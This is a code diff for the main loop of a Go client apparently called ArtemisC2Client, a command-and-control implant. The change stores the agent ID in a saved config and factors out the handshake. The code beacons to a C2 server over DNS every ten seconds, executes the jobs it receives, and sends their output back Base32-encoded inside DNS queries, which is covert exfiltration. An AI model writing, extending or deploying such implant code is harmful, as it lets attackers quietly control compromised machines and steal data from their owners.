@@ -8,32 +8,33 @@ import (
 	"github.com/desertcod98/ArtemisC2Client/commands"
 	"github.com/desertcod98/ArtemisC2Client/dns"
 	"github.com/desertcod98/ArtemisC2Client/encoding"
+	"github.com/desertcod98/ArtemisC2Client/config"
 )
 
-var AgentId string
-var BeaconInterval = 10 // seconds
-
 func main() {
-	handshakeRes, handshakeErr := dns.DnsQuery("handshake")
-	if handshakeErr != nil {
-		fmt.Println("Error:", handshakeErr)
-		return
-	}
-	fmt.Println("Handhsake job id:", handshakeRes)
+	cfg, configErr := config.LoadConfig()
 
-	completeHsRes, completeHsErr := dns.DnsQuery(handshakeRes)
-	if completeHsErr != nil {
-		fmt.Println("Error:", completeHsErr)
-		return
+	if(configErr != nil){
+		agentId, handshakeErr := doHandshake()
+		if(handshakeErr != nil){
+			fmt.Println("Handshake error:", handshakeErr)
+			return
+		}
+		cfg.AgentId = agentId
+		cfg.BeaconInterval = 10 // seconds
+		config.SaveConfig(cfg)
 	}
-	AgentId = completeHsRes
-	fmt.Println("Agent id:", AgentId)
+	
+	agentId := cfg.AgentId
+	beaconInterval := cfg.BeaconInterval
 
-	ticker := time.NewTicker(time.Duration(BeaconInterval) * time.Second)
+	fmt.Println("Agent id:", agentId)
+
+	ticker := time.NewTicker(time.Duration(beaconInterval) * time.Second)
 	defer ticker.Stop()
 
 	for range ticker.C {
-		beaconRes, beaconErr := dns.DnsQuery(AgentId + ".Beacon")
+		beaconRes, beaconErr := dns.DnsQuery(agentId + ".Beacon")
 		if beaconErr != nil {
 			fmt.Println("Error:", beaconErr)
 			return
@@ -56,6 +57,17 @@ func main() {
 			dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
 		}
 	}
+}
+
+func doHandshake() (string, error) {
+	var agentId string
+	handshakeRes, handshakeErr := dns.DnsQuery("handshake")
+	if handshakeErr != nil {
+		return agentId, handshakeErr
+	}
+	fmt.Println("Handhsake job id:", handshakeRes)
+
+	return dns.DnsQuery(handshakeRes)
 }
 
 func reverseStringArr(input []string) {
